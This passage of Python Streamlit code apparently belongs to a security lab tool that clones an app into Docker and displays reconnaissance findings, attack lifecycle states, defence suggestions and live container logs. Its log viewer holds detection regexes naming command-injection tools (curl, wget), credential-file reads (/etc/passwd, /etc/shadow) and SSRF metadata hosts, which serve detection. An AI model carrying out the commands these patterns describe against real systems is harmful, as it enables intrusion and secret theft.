            f'border:1px solid #E2E8F0;border-radius:999px;padding:3px 10px;'
            f'font-family:Inter,sans-serif;font-size:0.7rem;color:#1E293B;'
            f'font-weight:600;margin:2px 4px 2px 0">{c}</span>'
        )

    files_n   = recon.get("files_scanned", 0)
    logins_n  = len(recon.get("login_forms", []))
    routes_n  = len(recon.get("routes", []))
    apis_n    = len(recon.get("api_routes", []))
    raw_sql_n = recon.get("raw_sql_count", 0)
    sec_n     = len(recon.get("hardcoded_secrets", []))

    st.markdown(
        f'<div style="background:linear-gradient(135deg,#F8FAFC,#FFFFFF);'
        f'border:1px solid #E2E8F0;border-left:4px solid {r_color};'
        f'border-radius:10px;padding:12px 16px;margin-bottom:12px">'
        # Top row: risk score + label
        f'<div style="display:flex;align-items:center;justify-content:space-between;'
        f'margin-bottom:8px">'
        f'<div style="font-family:Inter,sans-serif;font-size:0.78rem;font-weight:700;'
        f'color:#0F172A;display:flex;align-items:center;gap:8px">'
        f'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#2563EB" '
        f'stroke-width="2" stroke-linecap="round"><path d="M21 11.5a8.38 8.38 0 0 '
        f'1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 '
        f'8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 '
        f'8.48 0 0 1 8 8v.5z"/></svg>'
        f'Source-aware reconnaissance · <span style="color:{r_color}">{r_label}</span>'
        f'</div>'
        f'<div style="display:flex;align-items:center;gap:8px">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.4rem;'
        f'font-weight:800;color:{r_color};line-height:1">{risk}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        f'color:#64748B;letter-spacing:0.1em">/100<br>RISK</div>'
        f'</div></div>'
        # KPI row
        f'<div style="display:grid;grid-template-columns:repeat(6,1fr);gap:6px;'
        f'margin-bottom:9px">'
        f'{_recon_kpi("Files", files_n, "#2563EB")}'
        f'{_recon_kpi("Logins", logins_n, "#DC2626")}'
        f'{_recon_kpi("Routes", routes_n, "#7C3AED")}'
        f'{_recon_kpi("APIs", apis_n, "#0284C7")}'
        f'{_recon_kpi("Raw SQL", raw_sql_n, "#F59E0B")}'
        f'{_recon_kpi("Secrets", sec_n, "#DC2626" if sec_n else "#16A34A")}'
        f'</div>'
        # Exposure chips
        + (f'<div style="margin-top:4px">{chip_html}</div>' if chip_html else "")
        + '</div>',
        unsafe_allow_html=True,
    )

    # ── DISCOVERED ARTIFACTS — concrete findings (genuinely useful) ──
    # v25: replaced "attack proposals" (no runner, redundant with Live
    # Malware Lab below) with hard data — login forms, API endpoints,
    # hardcoded secrets etc. that the user can act on directly.
    import html as _h

    sections = []

    # 1. Login forms found
    logins = recon.get("login_forms", [])
    if logins:
        rows = "".join(
            f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;'
            f'border-left:3px solid #DC2626;border-radius:6px;'
            f'padding:7px 11px;margin-bottom:4px;'
            f'font-family:JetBrains Mono,monospace;font-size:0.7rem;'
            f'color:#0F172A">'
            f'📍 <code style="color:#1E40AF">{_h.escape(lf.get("file","?"))}</code>'
            f' &nbsp;→&nbsp; action: '
            f'<code style="color:#DC2626">{_h.escape(lf.get("action","?"))}</code>'
            f'{" · ⚠ no CSRF token" if not lf.get("has_csrf_token") else " · ✓ CSRF token"}'
            f'</div>'
            for lf in logins[:5]
        )
        sections.append(("🔓 Login forms discovered", "#DC2626", rows))

    # 2. API routes
    apis = recon.get("api_routes", [])
    if apis:
        rows = "".join(
            f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;'
            f'border-left:3px solid #0284C7;border-radius:6px;'
            f'padding:6px 11px;margin-bottom:3px;'
            f'font-family:JetBrains Mono,monospace;font-size:0.7rem">'
            f'<b style="color:#0284C7">{_h.escape(r.get("method","GET"))}</b> '
            f'<code style="color:#0F172A">{_h.escape(r.get("path","/"))}</code>'
            f' <span style="color:#64748B;font-size:0.6rem"> · '
            f'{_h.escape(r.get("framework","?"))} · '
            f'{_h.escape(r.get("file","?"))}</span></div>'
            for r in apis[:8]
        )
        sections.append((f"📡 API endpoints ({len(apis)})", "#0284C7", rows))

    # 3. Hardcoded secrets — actionable
    secrets = recon.get("hardcoded_secrets", [])
    if secrets:
        rows = "".join(
            f'<div style="background:#FEF2F2;border:1px solid #FECACA;'
            f'border-left:3px solid #DC2626;border-radius:6px;'
            f'padding:7px 11px;margin-bottom:4px;'
            f'font-family:JetBrains Mono,monospace;font-size:0.7rem;color:#7F1D1D">'
            f'🗝 <b>{_h.escape(s.get("type","?"))}</b> in '
            f'<code style="color:#1E40AF">{_h.escape(s.get("file","?"))}</code>'
            f' line <b>{s.get("line","?")}</b>'
            f'</div>'
            for s in secrets[:8]
        )
        sections.append((f"🗝 Hardcoded secrets ({len(secrets)}) · ROTATE NOW",
                         "#DC2626", rows))

    # 4. File-upload endpoints
    uploads = recon.get("file_uploads", [])
    if uploads:
        rows = "".join(
            f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;'
            f'border-left:3px solid #F59E0B;border-radius:6px;'
            f'padding:7px 11px;margin-bottom:4px;'
            f'font-family:JetBrains Mono,monospace;font-size:0.7rem">'
            f'📤 <code style="color:#0F172A">{_h.escape(u.get("file","?"))}</code>'
            f' · MIME check: '
            f'<b style="color:{"#16A34A" if u.get("has_mime_check") else "#DC2626"}">'
            f'{"✓ present" if u.get("has_mime_check") else "✗ MISSING"}</b>'
            f'</div>'
            for u in uploads[:5]
        )
        sections.append(("📤 File-upload endpoints", "#F59E0B", rows))

    # 5. Admin panels
    admins = list(set(recon.get("admin_panels", [])))
    if admins:
        rows = "".join(
            f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;'
            f'border-left:3px solid #7C3AED;border-radius:6px;'
            f'padding:6px 11px;margin-bottom:3px;'
            f'font-family:JetBrains Mono,monospace;font-size:0.7rem">'
            f'🔑 <code style="color:#7C3AED">{_h.escape(a)}</code>'
            f'</div>'
            for a in admins[:5]
        )
        sections.append((f"🔑 Admin paths ({len(admins)})", "#7C3AED", rows))

    # 6. DB drivers used
    db_drivers = recon.get("db_drivers", [])
    raw_sql    = recon.get("raw_sql_count", 0)
    if db_drivers or raw_sql:
        driver_text = ", ".join(_h.escape(d) for d in db_drivers) or "(none)"
        sql_color   = "#DC2626" if raw_sql > 0 else "#16A34A"
        rows = (
            f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;'
            f'border-left:3px solid #16A34A;border-radius:6px;'
            f'padding:7px 11px;font-family:JetBrains Mono,monospace;font-size:0.7rem">'
            f'<b style="color:#0284C7">Drivers:</b> {driver_text}<br>'
            f'<b style="color:#475569">Raw SQL:</b> '
            f'<span style="color:{sql_color};font-weight:700">{raw_sql} raw queries</span>'
            f' · <b style="color:#475569">Parameterised:</b> '
            f'{recon.get("param_sql_count", 0)}'
            f'</div>'
        )
        sections.append(("🗄 Database layer", "#16A34A", rows))

    # 7. Security headers / posture
    hdrs = recon.get("security_headers", {})
    sess = recon.get("session_config", {})
    csrf = recon.get("csrf", {})
    rl   = recon.get("rate_limit", {})
    posture_rows = (
        f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;'
        f'border-radius:6px;padding:7px 11px;'
        f'font-family:JetBrains Mono,monospace;font-size:0.7rem;line-height:1.7">'
        f'<b style="color:#475569">Content-Security-Policy:</b> '
        f'<span style="color:{"#16A34A" if hdrs.get("csp") else "#DC2626"};font-weight:700">'
        f'{"✓ present" if hdrs.get("csp") else "✗ missing"}</span> &nbsp;·&nbsp; '
        f'<b style="color:#475569">HSTS:</b> '
        f'<span style="color:{"#16A34A" if hdrs.get("hsts") else "#F59E0B"};font-weight:700">'
        f'{"✓" if hdrs.get("hsts") else "—"}</span> &nbsp;·&nbsp; '
        f'<b style="color:#475569">X-Frame-Options:</b> '
        f'<span style="color:{"#16A34A" if hdrs.get("xframe") else "#F59E0B"};font-weight:700">'
        f'{"✓" if hdrs.get("xframe") else "—"}</span><br>'
        f'<b style="color:#475569">CSRF protection:</b> '
        f'<span style="color:{"#16A34A" if csrf.get("present") else "#DC2626"};font-weight:700">'
        f'{"✓ detected" if csrf.get("present") else "✗ not detected"}</span> &nbsp;·&nbsp; '
        f'<b style="color:#475569">Rate limiter:</b> '
        f'<span style="color:{"#16A34A" if rl.get("present") else "#DC2626"};font-weight:700">'
        f'{"✓ detected" if rl.get("present") else "✗ not detected"}</span>'
        f'</div>'
    )
    sections.append(("🛡 Security posture", "#16A34A", posture_rows))

    # ── Render sections ──
    for title, color, body in sections:
        st.markdown(
            f'<details style="background:#FFFFFF;border:1px solid #E2E8F0;'
            f'border-left:3px solid {color};border-radius:8px;'
            f'margin-bottom:6px;overflow:hidden" open>'
            f'<summary style="cursor:pointer;padding:8px 14px;'
            f'font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
            f'color:#0F172A;list-style:none;user-select:none">'
            f'<span style="color:{color}">▸</span> {title}'
            f'</summary>'
            f'<div style="padding:0 12px 10px">{body}</div>'
            f'</details>',
            unsafe_allow_html=True,
        )

    # ── Honest footnote (replaces the misleading runner promise) ──
    st.markdown(
        '<div style="background:#EFF6FF;border:1px dashed #BFDBFE;border-radius:8px;'
        'padding:9px 14px;margin-top:8px;font-family:Inter,sans-serif;font-size:0.72rem;'
        'color:#1E40AF;line-height:1.5">'
        'ℹ This is <b>read-only reconnaissance</b> of your cloned source code. '
        'The actual EICAR / webshell / dropper / path-traversal / header-injection / '
        'file-upload attacks run in the <b>Live Malware Lab</b> below — click '
        '<b>▶ Run Attack</b> on any card to fire them against this clone.'
        '</div>',
        unsafe_allow_html=True,
    )


def _recon_kpi(label: str, value, color: str) -> str:
    """Render one KPI cell for the recon panel."""
    return (
        f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;border-radius:7px;'
        f'padding:7px 9px;text-align:center">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.05rem;'
        f'font-weight:700;color:{color};line-height:1">{value}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        f'letter-spacing:0.1em;color:#64748B;text-transform:uppercase;margin-top:2px">'
        f'{label}</div></div>'
    )


def _render_lifecycle_panel(result: dict, state: dict | None = None) -> None:
    """
    3-state visual lifecycle showing what happens to the clone container:

      [1] BEFORE INFECTION    — original cloned files, untouched
      [2] ATTACK INSERTED     — what got injected & how (last lab attack)
      [3] MITIGATED           — what defences are blocking / would block

    Shows live signal from session state and the most recent attack log.
    Defensive: if `state` not provided we fetch it from session_state.
    """
    if state is None:
        try:
            state = st.session_state.get("dt_state", {}) or {}
        except Exception:
            state = {}
    state = state or {}
    result = result or {}
    clone_id = result.get("clone_id", "")
    stack    = result.get("stack", {}) or {}
    cname    = result.get("container_name", "")
    framework = stack.get("framework", "?")
    language  = stack.get("language", "?")

    # Pull the most recent lab attack log (if any)
    last_attack = None
    last_attack_key = None
    last_crits = 0
    last_evts = 0
    last_phase_count = {"recon": 0, "inject": 0, "post": 0, "react": 0}
    for s in _LAB_SAMPLES:
        log = state.get(f"lab_log_{s['key']}", [])
        if log:
            last_attack     = s
            last_attack_key = s["key"]
            for e in log:
                last_evts += 1
                if e.get("status") == "crit":
                    last_crits += 1
                ph = e.get("phase", "")
                if ph in last_phase_count:
                    last_phase_count[ph] += 1

    # Pull recent injection paths from log (post phase shows what changed)
    injected_files = []
    if last_attack_key:
        log = state.get(f"lab_log_{last_attack_key}", [])
        for e in log:
            if e.get("phase") == "inject" and e.get("status") == "ok":
                det = e.get("detail", "") or ""
                # extract file paths from the inject detail
                for ln in det.splitlines():
                    ln = ln.strip(" •-→›>\t")
                    if ln.startswith("/") and len(ln) < 120:
                        injected_files.append(ln)
        injected_files = list(dict.fromkeys(injected_files))[:6]  # dedup, cap 6

    # ── State icons & colors ──
    has_attack = bool(last_attack)
    is_compromised = last_crits > 0

    s1_color = "#16A34A"  # BEFORE — always green
    s2_color = "#DC2626" if is_compromised else ("#F59E0B" if has_attack else "#94A3B8")
    s3_color = "#2563EB"

    s1_status = "✓ Original"
    s2_status = ("🔴 Compromised" if is_compromised
                  else ("🟡 Inserted, monitoring" if has_attack else "○ Not yet"))
    s3_status = ("🛡 Active defence" if has_attack else "🛡 Standby")

    # ── BEFORE box content (compact) ──
    before_html = (
        f"<div style='font-family:JetBrains Mono,monospace;font-size:0.56rem;"
        f"color:#15803D;line-height:1.55;'>"
        f"📦 {framework} · 🐍 {language}<br/>"
        f"🐳 {cname[:20]}…<br/>"
        f"📁 Original source files<br/>"
        f"🟢 No payloads · clean endpoints"
        f"</div>"
    )

    # ── ATTACK INSERTED box content (compact) ──
    if not has_attack:
        attack_html = (
            "<div style='font-family:Inter,sans-serif;font-size:0.6rem;"
            "color:#64748B;line-height:1.5;text-align:center;padding:6px 0;'>"
            "<div style='font-size:0.95rem;margin-bottom:2px'>⏳</div>"
            "Run an attack from the<br/>"
            "<b>Live Malware Lab</b> below"
            "</div>"
        )
    else:
        atk_label  = last_attack.get("label", last_attack_key or "?")
        atk_icon   = last_attack.get("icon", "🧪")
        atk_color  = last_attack.get("color", "#DC2626")
        files_html = ""
        if injected_files:
            files_html = "".join(
                f"<div style='font-family:JetBrains Mono,monospace;font-size:0.52rem;"
                f"color:#7F1D1D;background:#FFFFFF;border:1px solid #FECACA;"
                f"padding:2px 5px;border-radius:3px;margin-top:2px;word-break:break-all'>"
                f"📄 {f[:36]}{'…' if len(f) > 36 else ''}</div>"
                for f in injected_files[:3]
            )
        else:
            files_html = (
                "<div style='font-family:JetBrains Mono,monospace;font-size:0.52rem;"
                "color:#92400E;background:#FEF3C7;border:1px solid #FCD34D;"
                "padding:3px 6px;border-radius:3px;margin-top:2px'>"
                "ℹ probe only — no new files</div>"
            )

        # Phase breakdown (compact)
        ph_chips = ""
        for ph_label, ph_emoji in [("recon", "🔍"), ("inject", "💉"),
                                    ("post", "🔬"), ("react", "🛡")]:
            n = last_phase_count[ph_label]
            if n > 0:
                ph_chips += (
                    f"<span style='font-family:JetBrains Mono,monospace;font-size:0.48rem;"
                    f"font-weight:700;color:#7F1D1D;background:rgba(220,38,38,0.08);"
                    f"border:1px solid rgba(220,38,38,0.25);"
                    f"padding:1px 4px;border-radius:3px;margin-right:2px'>"
                    f"{ph_emoji}{n}</span>"
                )

        attack_html = (
            f"<div style='font-family:Inter,sans-serif;font-size:0.58rem;"
            f"color:#7F1D1D;line-height:1.5;'>"
            f"<div style='display:flex;align-items:center;gap:4px;margin-bottom:3px'>"
            f"<span style='font-size:0.78rem'>{atk_icon}</span>"
            f"<b style='color:{atk_color};font-size:0.62rem'>{atk_label}</b></div>"
            f"<div style='font-family:JetBrains Mono,monospace;font-size:0.5rem;"
            f"color:#991B1B;margin-bottom:3px'>"
            f"{last_evts} events · {last_crits} crit</div>"
            f"<div style='margin-bottom:3px'>{ph_chips}</div>"
            f"{files_html}"
            f"</div>"
        )

    # ── MITIGATED box content ──
    # Match defences to the attack type
    _DEFENCE_MAP = {
        "eicar": [
            ("🛡 AV signature scanning", "blocks known-bad hashes"),
            ("🛡 Real-time file watcher", "alerts on writes to web root"),
            ("🛡 Content-Type lockdown", "rejects octet-stream uploads"),
        ],
        "php_webshell": [
            ("🛡 php_admin_flag off", "disable PHP in /uploads"),
            ("🛡 disable_functions=eval,exec", "neutralise RCE primitives"),
            ("🛡 open_basedir restrict", "containment to allowed paths"),
        ],
        "php_dropper": [
            ("🛡 File-integrity monitor", "Tripwire on web root"),
            ("🛡 Read-only container FS", "Docker --read-only flag"),
            ("🛡 EDR file-create hooks", "kernel-level write detection"),
        ],
        "path_traversal": [
            ("🛡 realpath() validation", "reject ../ outside webroot"),
            ("🛡 Allow-list filenames", "regex [a-zA-Z0-9._-]+ only"),
            ("🛡 open_basedir / chroot", "FS-level containment"),
        ],
        "header_injection": [
            ("🛡 Strip CRLF in headers", "block %0d%0a injection"),
            ("🛡 WAF header rules", "ModSecurity OWASP CRS"),
            ("🛡 Validate User-Agent", "allow-list known values"),
        ],
        "file_upload_exploit": [
            ("🛡 MIME-type validation", "magic-byte check, not extension"),
            ("🛡 Strip .php/.phtml exts", "rename uploads to .bin"),
            ("🛡 CSP no-script-src 'self'", "block inline JS execution"),
        ],
    }
    defences = _DEFENCE_MAP.get(last_attack_key, [
        ("🛡 WAF (ModSecurity)", "blocks SQLi, XSS, LFI patterns"),
        ("🛡 Container isolation", "Docker namespace = blast radius limited"),
        ("🛡 Read-only filesystem", "prevent persistence on web root"),
        ("🛡 Network egress filter", "block C2 callback domains"),
        ("🛡 EDR + file-integrity", "detect any write to system paths"),
    ])

    mitig_rows = "".join(
        f"<div style='font-family:Inter,sans-serif;font-size:0.56rem;"
        f"color:#1E3A8A;line-height:1.45;margin-bottom:2px'>"
        f"<b style='color:#1E40AF'>{name}</b> · "
        f"<span style='color:#475569'>{desc}</span></div>"
        for name, desc in defences[:4]
    )
    mitig_html = (
        f"<div style='font-family:Inter,sans-serif;'>"
        f"{mitig_rows}"
        f"</div>"
    )

    # ── Render the 3-stage panel (v24: compact) ──
    st.markdown(
        '<style>'
        '@keyframes dt-arrow-bounce { 0%,100%{transform:translateX(0)} 50%{transform:translateX(3px)} }'
        '.dt-life-arrow { animation: dt-arrow-bounce 1.6s ease-in-out infinite; }'
        '@keyframes dt-pulse { 0%,100%{opacity:1} 50%{opacity:0.45} }'
        '.dt-life-pulse { animation: dt-pulse 1.4s ease-in-out infinite; }'
        '</style>'
        '<div style="background:linear-gradient(135deg,#F8FAFC,#FFFFFF);'
        'border:1px solid #E2E8F0;border-radius:8px;padding:8px 10px;'
        'margin:6px 0 10px;">'
        # Header (slim)
        '<div style="display:flex;align-items:center;justify-content:space-between;'
        'margin-bottom:6px;padding-bottom:4px;border-bottom:1px solid #F1F5F9">'
        '<div style="font-family:Inter,sans-serif;font-size:0.7rem;font-weight:700;'
        'color:#0F172A;display:flex;align-items:center;gap:5px">'
        '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#2563EB" '
        'stroke-width="2" stroke-linecap="round" stroke-linejoin="round">'
        '<path d="M3 12h18M3 6h18M3 18h18"/></svg>'
        'Clone Lifecycle · before → attack → mitigated</div>'
        '<span style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        'font-weight:700;color:#475569;background:#F1F5F9;border:1px solid #E2E8F0;'
        'padding:2px 6px;border-radius:4px;letter-spacing:0.06em">'
        'IMPACT MAP</span>'
        '</div>'
        # 3-column compact row
        '<div style="display:grid;grid-template-columns:1fr 16px 1fr 16px 1fr;'
        'gap:5px;align-items:stretch">'
        # ── BOX 1: BEFORE ──
        f'<div style="background:#F0FDF4;border:1px solid #BBF7D0;'
        f'border-left:3px solid {s1_color};border-radius:6px;padding:7px 9px">'
        f'<div style="display:flex;align-items:center;gap:4px;margin-bottom:3px">'
        f'<span style="font-size:0.78rem">🟢</span>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        f'font-weight:700;color:#14532D;letter-spacing:0.12em">STATE 1</span>'
        f'</div>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.68rem;font-weight:700;'
        f'color:#14532D">BEFORE INFECTION</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        f'color:{s1_color};font-weight:700;margin-bottom:4px">{s1_status}</div>'
        f'{before_html}'
        f'</div>'
        # Arrow 1
        '<div style="display:flex;align-items:center;justify-content:center;'
        'font-size:0.95rem;color:#94A3B8" class="dt-life-arrow">→</div>'
        # ── BOX 2: ATTACK INSERTED ──
        f'<div style="background:{"#FEF2F2" if is_compromised else ("#FFFBEB" if has_attack else "#F8FAFC")};'
        f'border:1px solid {"#FECACA" if is_compromised else ("#FDE68A" if has_attack else "#E2E8F0")};'
        f'border-left:3px solid {s2_color};border-radius:6px;padding:7px 9px">'
        f'<div style="display:flex;align-items:center;gap:4px;margin-bottom:3px">'
        f'<span style="font-size:0.78rem" class="{"dt-life-pulse" if has_attack else ""}">{"🔴" if is_compromised else ("🟡" if has_attack else "⚪")}</span>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        f'font-weight:700;color:{s2_color};letter-spacing:0.12em">STATE 2</span>'
        f'</div>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.68rem;font-weight:700;'
        f'color:{s2_color}">ATTACK INSERTED</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        f'color:{s2_color};font-weight:700;margin-bottom:4px">{s2_status}</div>'
        f'{attack_html}'
        f'</div>'
        # Arrow 2
        '<div style="display:flex;align-items:center;justify-content:center;'
        'font-size:0.95rem;color:#94A3B8" class="dt-life-arrow">→</div>'
        # ── BOX 3: MITIGATED ──
        f'<div style="background:#EFF6FF;border:1px solid #BFDBFE;'
        f'border-left:3px solid {s3_color};border-radius:6px;padding:7px 9px">'
        f'<div style="display:flex;align-items:center;gap:4px;margin-bottom:3px">'
        f'<span style="font-size:0.78rem">🛡</span>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        f'font-weight:700;color:#1E40AF;letter-spacing:0.12em">STATE 3</span>'
        f'</div>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.68rem;font-weight:700;'
        f'color:#1E40AF">MITIGATED · DEFENCE</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        f'color:#1E40AF;font-weight:700;margin-bottom:4px">{s3_status}</div>'
        f'{mitig_html}'
        f'</div>'
        '</div>'
        '</div>',
        unsafe_allow_html=True,
    )


def _get_container_status(result: dict) -> str:
    """Check live Docker container status: running / exited / missing."""
    try:
        import docker
        client = docker.from_env()
        cname = result.get("container_name", "")
        if not cname:
            return "unknown"
        c = client.containers.get(cname)
        return c.status          # "running", "exited", "paused", etc.
    except Exception:
        return "missing"


def _get_container_logs(result: dict, tail: int = 40) -> str:
    """Fetch real container logs (stdout+stderr) — used to diagnose crashes."""
    try:
        import docker
        client = docker.from_env()
        cname = result.get("container_name", "")
        if not cname:
            return ""
        c = client.containers.get(cname)
        raw = c.logs(tail=tail, stdout=True, stderr=True)
        return raw.decode("utf-8", errors="replace").strip()
    except Exception:
        return ""


def _restart_container(result: dict) -> bool:
    """
    Restart a stopped clone container.

    Strategy (in order):
      1. If the container still exists (just stopped) → container.start()
         — this preserves the EXACT original image CMD (the real app).
      2. Otherwise re-run the image. We do NOT override the CMD, so the
         Dockerfile's real entrypoint (uvicorn/flask/apache/nginx) runs.
    """
    try:
        import docker
        client = docker.from_env()
        cname  = result.get("container_name", "")
        image_tag = f"aidtctm_clone_{result.get('clone_id', '')}:latest"
        port   = result.get("host_port", 8090)
        stack  = result.get("stack", {})
        int_port = stack.get("internal_port", 3000)

        # Config-driven network (matches the engine, not hardcoded)
        try:
            from config import CFG
            network = getattr(CFG, "DOCKER_TWIN_NETWORK", "aidtctm_twin_net")
        except Exception:
            network = "aidtctm_twin_net"

        # 1) Container exists but stopped → just start it (keeps real CMD)
        try:
            existing = client.containers.get(cname)
            if existing.status != "running":
                existing.start()
            return True
        except docker.errors.NotFound:
            pass  # fall through to re-run from image

        # 2) Re-run from image WITHOUT overriding CMD → real entrypoint runs
        client.containers.run(
            image=image_tag,
            name=cname,
            detach=True,
            ports={f"{int_port}/tcp": port},
            network=network,
            labels={
                "created_by": "aidtctm",
                "clone_id":   result.get("clone_id", ""),
                "clone_type": "source_code",
                "stack":      stack.get("framework", ""),
            },
            mem_limit="1g",
            cpu_quota=50000,
            cpu_period=100000,
            security_opt=["no-new-privileges"],
            restart_policy={"Name": "unless-stopped"},
        )
        return True
    except Exception as e:
        import traceback; traceback.print_exc()
        return False


_CRASH_PATTERNS = [
    # Python missing packages
    (re.compile(r"ModuleNotFoundError: No module named '([^']+)'"),
     "missing_pip",
     lambda m: {
         "title": f"Missing Python package: `{m.group(1)}`",
         "detail": f"The app imports `{m.group(1)}` but it wasn't installed. "
                   f"Add it to `requirements.txt` or the system will auto-install it on next deploy.",
         "fix_label": f"Install {m.group(1)} & Restart",
         "fix_pkg": m.group(1),
         "severity": "error",
     }),
    # Node tsx/ts-node not found
    (re.compile(r"sh: (tsx|ts-node|tsc): not found"),
     "missing_build_tool",
     lambda m: {
         "title": f"Build tool `{m.group(1)}` not found",
         "detail": "This happens when NODE_ENV=production is set before npm install — "
                   "npm skips devDependencies (tsx, vite, esbuild) so the build fails. "
                   "Fixed in the latest deploy — redeploy the ZIP to apply the fix.",
         "fix_label": None,
         "severity": "error",
     }),
    # DATABASE_URL / env var required
    (re.compile(r"(DATABASE_URL|MONGO_URI|REDIS_URL).+?(must be set|not found|required)", re.I),
     "missing_env",
     lambda m: {
         "title": f"Required environment variable: `{m.group(1)}`",
         "detail": "The app needs a real database URL. The placeholder stub only prevents "
                   "startup crashes — actual DB queries will fail. "
                   "Set the real DATABASE_URL in the container if you have a DB.",
         "fix_label": None,
         "severity": "warn",
     }),
    # Port already in use
    (re.compile(r"EADDRINUSE|address already in use|port.{1,20}in use", re.I),
     "port_conflict",
     lambda m: {
         "title": "Port already in use",
         "detail": "Another process is using this port inside the container. "
                   "Try destroying this clone and redeploying — a new port will be allocated.",
         "fix_label": None,
         "severity": "error",
     }),
    # OOM / killed
    (re.compile(r"Killed|OOMKilled|out of memory", re.I),
     "oom",
     lambda m: {
         "title": "Container killed — out of memory",
         "detail": "The app used more than the 1 GB container memory limit. "
                   "This often happens with large ML model loading (tensorflow, pytorch). "
                   "The 93 MB Keras models are excluded from the clone but the app may still try to load them at runtime.",
         "fix_label": None,
         "severity": "error",
     }),
    # npm build errors
    (re.compile(r"npm ERR! code (\w+)"),
     "npm_error",
     lambda m: {
         "title": f"npm build error: {m.group(1)}",
         "detail": "The npm build step failed. Check the full logs below for the specific error. "
                   "Common causes: missing peer dependency, TypeScript error, or missing env var during build.",
         "fix_label": None,
         "severity": "error",
     }),
    # Python syntax error
    (re.compile(r"SyntaxError: (.+)"),
     "syntax_error",
     lambda m: {
         "title": f"Python syntax error: {m.group(1)[:60]}",
         "detail": "The app has a syntax error that prevents it from starting. "
                   "Open the file in the workbench and fix it, then click Restart.",
         "fix_label": None,
         "severity": "error",
     }),
    # Connection refused (app started but port wrong)
    (re.compile(r"ECONNREFUSED|Connection refused", re.I),
     "conn_refused",
     lambda m: {
         "title": "App started but refused connections",
         "detail": "The server may be listening on 127.0.0.1 instead of 0.0.0.0, "
                   "which blocks external access from the host. "
                   "The app needs `host='0.0.0.0'` or equivalent.",
         "fix_label": None,
         "severity": "warn",
     }),
]


def _render_live_logs(result: dict) -> None:
    """Live container log viewer — real-time attack detection + visual reactions."""
    import re as _re
    import time as _time

    cname = result.get("container_name", "")
    if not cname:
        return

    # ── Attack patterns to detect in HTTP request URLs ────────────────────
    _ATTACK_SIGS = [
        (_re.compile(r"('|%27)\s*(or|and|union|select|drop|insert|delete|update|exec|xp_|sleep\(|benchmark\()", _re.I),
         "SQLi", "#F87171", "💉"),
        (_re.compile(r"<script|javascript:|onerror=|alert\s*\(|onload=|svg.*onload|eval\(|document\.cookie", _re.I),
         "XSS", "#FB923C", "📜"),
        (_re.compile(r"\.\./|\.\.\\\\|/etc/passwd|/etc/shadow|/proc/self|/windows/system32", _re.I),
         "PathTraversal", "#FBBF24", "📂"),
        (_re.compile(r";\s*(ls|cat|rm|wget|curl|chmod|id|whoami|uname|netstat)|`[^`]+`|\$\([^)]+\)", _re.I),
         "CmdInject", "#E879F9", "💀"),
        (_re.compile(r"(127\.0\.0\.1|169\.254\.|metadata\.google\.internal|instance-data|fd00::)", _re.I),
         "SSRF", "#A78BFA", "🔗"),
        (_re.compile(r"(admin|wp-admin|phpMyAdmin|\.env|\.git/config|backup\.sql|config\.php)", _re.I),
         "Recon", "#38BDF8", "🔍"),
    ]

    # ── HTTP access log regex (Apache / Nginx / Gunicorn / uvicorn) ───────
    # Normal: 172.18.0.1 - - [..] "GET /path HTTP/1.1" 200 636
    _HTTP_RE = _re.compile(
        r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[^\[]*\[([^\]]+)\]\s+"(\w+)\s+([^\s"]+)[^"]*"\s+(\d{3})'
    )
    # Timeout/empty: 172.18.0.1 - - [..] "-" 408 0 "-" "-"
    _HTTP_EMPTY_RE = _re.compile(
        r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[^\[]*\[([^\]]+)\]\s+"-"\s+(\d{3})'
    )
    # Apache/Nginx startup noise lines to dim (not show as errors)
    _NOISE_RE = _re.compile(
        r'AH\d{5}:|mpm_prefork|core:notice|Command line:|FOREGROUND|'
        r'configured.*resuming|gracefully restarting|resuming normal',
        _re.I
    )

    with st.expander("📋 Live Container Logs", expanded=False):

        # ── Controls row ──────────────────────────────────────────────────
        c1, c2, c3, c4 = st.columns([2, 1, 1, 1])
        with c1:
            tail_n = st.selectbox(
                "Lines", [50, 100, 200, 500], index=1,
                key="dt_log_tail", label_visibility="collapsed",
            )
        with c2:
            do_fetch = st.button("🔄 Refresh", key="dt_log_fetch", use_container_width=True)
        with c3:
            do_live = st.button("⚡ Live", key="dt_log_live", use_container_width=True,
                                help="Auto-refresh every 3 seconds")
        with c4:
            do_clear = st.button("✕ Clear", key="dt_log_clear", use_container_width=True)

        if do_clear:
            st.session_state.pop("dt_log_cache", None)
            st.session_state.pop("dt_log_live_on", None)

        if do_live:
            # Toggle live mode on/off
            st.session_state["dt_log_live_on"] = not st.session_state.get("dt_log_live_on", False)

        # Live mode indicator + proper 3s auto-refresh
        is_live = st.session_state.get("dt_log_live_on", False)
        if is_live:
            st.markdown(
